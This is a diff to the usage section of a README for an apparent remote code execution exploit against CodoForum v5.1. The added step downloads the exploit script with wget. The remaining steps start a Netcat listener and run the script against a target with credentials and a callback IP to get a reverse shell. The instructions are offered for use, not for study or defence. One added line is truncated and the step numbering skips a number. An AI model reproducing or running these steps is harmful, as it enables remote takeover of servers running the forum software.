@@ -68,14 +68,19 @@ def uploadAndExploit():
 ---
 
 ## How to use
-
-1. Start your Netcat listener:
+0. Get my exploit.py first, wget so w
+   ```bash
+   wget https://github.com/skiraware/CodoForum-v5.1---Remote-Code-Execution-RCE-/raw/refs/heads/main/exploit.py
+   ```
+   
+2. Start your Netcat listener:
    ```bash
    nc -lvnp 4445
    ```
-2. Run the exploit (Ensure you provide the correct URL path):
+3. Run the exploit (Ensure you provide the correct URL path):
    ```bash
    python3 exploit.py -t http://<TARGET_IP>/ -u <USERNAME> -p <PASSWORD> -i <YOUR_IP> -n 4445
    ```
 
 *Note: If CodoForum is hosted in a subdirectory, append it to the target flag (e.g., `-t http://<TARGET_IP>/somepages`).*
+
